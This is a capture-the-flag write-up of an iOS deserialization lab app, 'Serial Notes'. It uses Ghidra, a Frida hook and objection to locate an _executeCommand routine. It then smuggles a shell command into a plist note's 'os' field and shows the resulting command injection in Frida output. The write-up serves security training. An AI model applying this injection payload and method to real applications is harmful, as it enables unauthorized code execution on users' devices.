---
title: Serial Notes - Mobile Hacking Lab
date: 2025-6-20 00:00:00 +/-TTTT
categories: [Mobile Hacking Lab]
tags: [mobile hacking lab, writeup, mobile penetration testing, ios]     # TAG names should always be lowercase
---



<br />

**Introduction**

Welcome to the **iOS Application Security Lab: Deserialization Vulnerability Challenge**. The challenge revolves around a fictitious note-taking app called Serial Notes. Serial Notes is designed to support markdown editing and has its own file format to share the notes. However, it harbors a critical vulnerability related to deserialization, which can be escalated to command injection. Your objective is to exploit this vulnerability to execute arbitrary command within the app.

<br />

**Objective**

**Deserialization Understanding**: Familiarity with the concept and implications of deserialization vulnerabilities in application security.



<br />



**Reverse Engineering with Ghidra**

<br />

The `_executeCommand` method is triggered by both the `packFile` and `openFile` functions.

![](/assets/img/mhl/SerialNotes/1.png)

<br />

![](/assets/img/mhl/SerialNotes/2.png)

<br />

There’s also a string included in the binary: `uname -a | grep -o ' `.



![](/assets/img/mhl/SerialNotes/4.png)





<br />

The `_executeCommand` method is located at offset **0x414c**.

![](/assets/img/mhl/SerialNotes/3.png)



<br />

Frida script to hook the `_executeCommand` method and print its parameter.

```javascript
var addr = ptr(0x414c);
var t_module = 'SerialNotes';
var nw = Module.getBaseAddress(t_module);
var toAtt = nw.add(addr);

Interceptor.attach(toAtt, {
    onEnter: function (args) {
        // First parameter (x0 on arm64)
        var p0 = args[0];

        console.log("[*] onEnter: target = " + toAtt);
    

        if (p0.isNull && p0.isNull()) {
            console.log("[*] arg0 is NULL");
            return;
        }

        // Try interpreting as C-string
        try {
            var s = Memory.readUtf8String(p0);
            if (s !== null) {
                console.log("[*] arg0 as C-string: " + s);
            }
        } catch (err) {
            // not a valid C-string or unreadable
        }

    }
});
```

<br />

Pressing the **Save** button produces the following output:

```
[iOS Device::com.mobilehackinglab.SerialNotes2.J8L462KYQ8 ]-> [*] onEnter: _executeCommand target = 0x10281414c
[*] arg0 of _executeCommand as C-string: uname -a
```

<br />

Pressing the **Open** button produces the following output:

```
[iOS Device::com.mobilehackinglab.SerialNotes2.J8L462KYQ8 ]-> [*] onEnter: _executeCommand target = 0x10281414c
[*] arg0 of _executeCommand as C-string: uname -a  | grep -o 'Darwin iPhone 22.6.0 Darwin Kernel Version 22.6.0' | head -n1
```

<br />

Download the notes.serial file with objeciton

```
└─# objection -g com.mobilehackinglab.SerialNotes2.J8L462KYQ8 explore
Using USB device `iOS Device`
Agent injected and responds ok!

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.11.0

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
...inglab.SerialNotes2.J8L462KYQ8 on (iPhone: 16.0) [usb] # file download /private/var/mobile/Containers/Data/Application/75945BC4-E7B4-4F42-B102-BCE7FC8CBAF5/Documents/notes.serial
Downloading /private/var/mobile/Containers/Data/Application/75945BC4-E7B4-4F42-B102-BCE7FC8CBAF5/Documents/notes.serial to notes.serial
Streaming file from device...
Writing bytes to destination...
Successfully downloaded /private/var/mobile/Containers/Data/Application/75945BC4-E7B4-4F42-B102-BCE7FC8CBAF5/Documents/notes.serial to notes.serial
```

<br />

Convert the serialized file to an XML file

```
└─# plistutil -i notes.serial -o notes.xml
```

<br />

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>$version</key>
        <integer>100000</integer>
        <key>$archiver</key>
        <string>NSKeyedArchiver</string>
        <key>$top</key>
        <dict>
                <key>root</key>
                <dict>
                        <key>CF$UID</key>
                        <integer>1</integer>
                </dict>
        </dict>
        <key>$objects</key>
        <array>
                <string>$null</string>
                <dict>
                        <key>NS.objects</key>
                        <array>
                                <dict>
                                        <key>CF$UID</key>
                                        <integer>2</integer>
                                </dict>
                        </array>
                        <key>$class</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>8</integer>
                        </dict>
                </dict>
                <dict>
                        <key>last_updated</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>5</integer>
                        </dict>
                        <key>content</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>4</integer>
                        </dict>
                        <key>os</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>6</integer>
                        </dict>
                        <key>name</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>3</integer>
                        </dict>
                        <key>$class</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>7</integer>
                        </dict>
                </dict>
                <string>Test</string>
                <string>hello</string>
                <string>Thu, 25 Sep 2025 13:17:24 GMT</string>
                <string>Darwin iPhone 22.6.0 Darwin Kernel Version 22.6.0: Tue Jul  2 20:47:35 PDT 2024; root:xnu-8796.142.1.703.8~1/RELEASE_ARM64_T8015 iPhone10,3 arm Darwin</string>

                <dict>
                        <key>$classname</key>
                        <string>SerialNotes.Note</string>
                        <key>$classes</key>
                        <array>
                                <string>SerialNotes.Note</string>
                                <string>NSObject</string>
                        </array>
                </dict>
                <dict>
                        <key>$classname</key>
                        <string>NSArray</string>
                        <key>$classes</key>
                        <array>
                                <string>NSArray</string>
                                <string>NSObject</string>
                        </array>
                </dict>
        </array>
</dict>
</plist>
```

The file stores information about the note, including its name, content, last_updated, and os. also, the os field contains the output of the `uname -a` command.

<br />

We can modify this file to inject a command so the executed command becomes:
 `uname -a | grep -o 'any' ; <INJECTED-COMMAND> ; # | head -n1`

The payload used is `any' ; <INJECTED-COMMAND> ; #`, where `#` comments out the remainder.

<br />

The XML file after injecting the `echo` command.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>$version</key>
        <integer>100000</integer>
        <key>$archiver</key>
        <string>NSKeyedArchiver</string>
        <key>$top</key>
        <dict>
                <key>root</key>
                <dict>
                        <key>CF$UID</key>
                        <integer>1</integer>
                </dict>
        </dict>
        <key>$objects</key>
        <array>
                <string>$null</string>
                <dict>
                        <key>NS.objects</key>
                        <array>
                                <dict>
                                        <key>CF$UID</key>
                                        <integer>2</integer>
                                </dict>
                        </array>
                        <key>$class</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>8</integer>
                        </dict>
                </dict>
                <dict>
                        <key>last_updated</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>5</integer>
                        </dict>
                        <key>content</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>4</integer>
                        </dict>
                        <key>os</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>6</integer>
                        </dict>
                        <key>name</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>3</integer>
                        </dict>
                        <key>$class</key>
                        <dict>
                                <key>CF$UID</key>
                                <integer>7</integer>
                        </dict>
                </dict>
                <string>Test</string>
                <string>hello</string>
                <string>Thu, 25 Sep 2025 13:17:24 GMT</string>
                <string>any'; echo \"pwned\" > /tmp/rce.txt # </string>

                <dict>
                        <key>$classname</key>
                        <string>SerialNotes.Note</string>
                        <key>$classes</key>
                        <array>
                                <string>SerialNotes.Note</string>
                                <string>NSObject</string>
                        </array>
                </dict>
                <dict>
                        <key>$classname</key>
                        <string>NSArray</string>
                        <key>$classes</key>
                        <array>
                                <string>NSArray</string>
                                <string>NSObject</string>
                        </array>
                </dict>
        </array>
</dict>
</plist>
```

<br />

Transfer this file to the iPhone and launch the app with Frida. After clicking ‘Open File’, the output shows that our command was successfully passed as a parameter to the `_executeCommand` method

 `uname -a | grep -o 'test' ; echo "pwned" > /tmp/rce.txt #' | head -n1`

```
Spawning `com.mobilehackinglab.SerialNotes2.W46SY5ZJ6Z`...              
[*] module base: 0x100290000 target addr: 0x10029414c
[*] DebugSymbol: executeCommand  (0x10029414c)
[*] Exact symbol: executeCommand @ 0x10029414c
[*] Attached to 0x10029414c
Spawned `com.mobilehackinglab.SerialNotes2.W46SY5ZJ6Z`. Resuming main thread!
[iOS Device::com.mobilehackinglab.SerialNotes2.W46SY5ZJ6Z ]-> [*] onEnter: target = 0x10029414c
[*] arg0 as C-string: uname -a  | grep -o 'test' ; echo "pwned" > /tmp/rce.txt #' | head -n1
```

